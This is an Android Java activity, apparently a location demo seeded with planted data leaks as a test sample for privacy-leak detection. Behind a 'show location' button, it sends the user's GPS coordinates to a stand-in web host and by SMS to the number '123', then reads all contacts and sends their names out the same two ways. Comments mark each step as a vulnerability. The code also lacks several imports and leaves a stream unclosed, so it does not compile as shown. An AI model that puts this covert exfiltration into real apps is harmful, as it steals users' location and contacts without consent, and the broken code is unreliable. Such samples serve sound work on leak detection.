package com.javacodegeeks.android.lbs;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

import android.app.Activity;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.Toast;

public class LbsGeocodingActivity extends Activity {
	
	private static final long MINIMUM_DISTANCE_CHANGE_FOR_UPDATES = 1; // in Meters
	private static final long MINIMUM_TIME_BETWEEN_UPDATES = 1000; // in Milliseconds
	
	protected LocationManager locationManager;
	
	protected Button retrieveLocationButton;
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
    	
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        retrieveLocationButton = (Button) findViewById(R.id.retrieve_location_button);
        
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        
        locationManager.requestLocationUpdates(
        		LocationManager.GPS_PROVIDER, 
        		MINIMUM_TIME_BETWEEN_UPDATES, 
        		MINIMUM_DISTANCE_CHANGE_FOR_UPDATES,
        		new MyLocationListener()
        );
        
		retrieveLocationButton.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
				showCurrentLocation();
			}
		});        
        
    }    

	protected void showCurrentLocation() {

		Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);

		if (location != null) {
			String message = String.format(
					"Current Location \n Longitude: %1$s \n Latitude: %2$s",
					location.getLongitude(), location.getLatitude()
			);
			Toast.makeText(LbsGeocodingActivity.this, message,
					Toast.LENGTH_LONG).show();
			try {
				sendGPSInfo(location);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		else {
			String message = "Can not calculate location";
			Toast.makeText(LbsGeocodingActivity.this, message,
					Toast.LENGTH_LONG).show();
		}

	}  
	private void sendGPSInfo(Location location) throws IOException{
		String urlStr = "http://www.any-site.com/";
		URL url = new URL(urlStr);
		URLConnection urlConnection = url.openConnection();
		OutputStream  outStream = urlConnection.getOutputStream();		

		// Vulnerability - sending GPS info over network
		outStream.write(String.valueOf(location.getLatitude()).getBytes());
		outStream.write(String.valueOf(location.getLongitude()).getBytes());
		    
		//TODO how to close?

		
		PendingIntent pi = PendingIntent.getActivity(this, 0, new Intent(this, null), 0);                
        SmsManager sms = SmsManager.getDefault();
		// Vulnerability - sending GPS info over SMS
        sms.sendTextMessage("123", null,String.valueOf(location.getLatitude()), pi, null);  
			

			String columns[] = new String[] { Contacts.People.NAME, Contacts.People.NUMBER };
        Uri mContacts = Contacts.People.CONTENT_URI;
        Cursor cur = managedQuery(mContacts, columns, // Which columns to return
                null, // WHERE clause; which rows to return(all rows)
                null, // WHERE clause selection arguments (none)
                null // Order-by clause (ascending by name)

        );
        if (cur.moveToFirst()) {
            String name = null;
            String phoneNo = null;
            do {
                // Get the field values            	
                name = cur.getString(cur.getColumnIndex(Contacts.People.NAME));         
                phoneNo = cur.getString(cur.getColumnIndex(Contacts.People.NUMBER));         
                Toast.makeText(this, name + " " + phoneNo, Toast.LENGTH_LONG).show();

				// Vulnerability - sending Contacts over network and SMS
				outStream.write(name.getBytes());
       		    sms.sendTextMessage("123", null,name, pi, null);  

            } while (cur.moveToNext());
        }
	}

	private class MyLocationListener implements LocationListener {

		public void onLocationChanged(Location location) {
			String message = String.format(
					"New Location \n Longitude: %1$s \n Latitude: %2$s",
					location.getLongitude(), location.getLatitude()
			);
			Toast.makeText(LbsGeocodingActivity.this, message, Toast.LENGTH_LONG).show();
		}

		public void onStatusChanged(String s, int i, Bundle b) {
			Toast.makeText(LbsGeocodingActivity.this, "Provider status changed",
					Toast.LENGTH_LONG).show();
		}

		public void onProviderDisabled(String s) {
			Toast.makeText(LbsGeocodingActivity.this,
					"Provider disabled by the user. GPS turned off",
					Toast.LENGTH_LONG).show();
		}

		public void onProviderEnabled(String s) {
			Toast.makeText(LbsGeocodingActivity.this,
					"Provider enabled by the user. GPS turned on",
					Toast.LENGTH_LONG).show();
		}

	}
    
}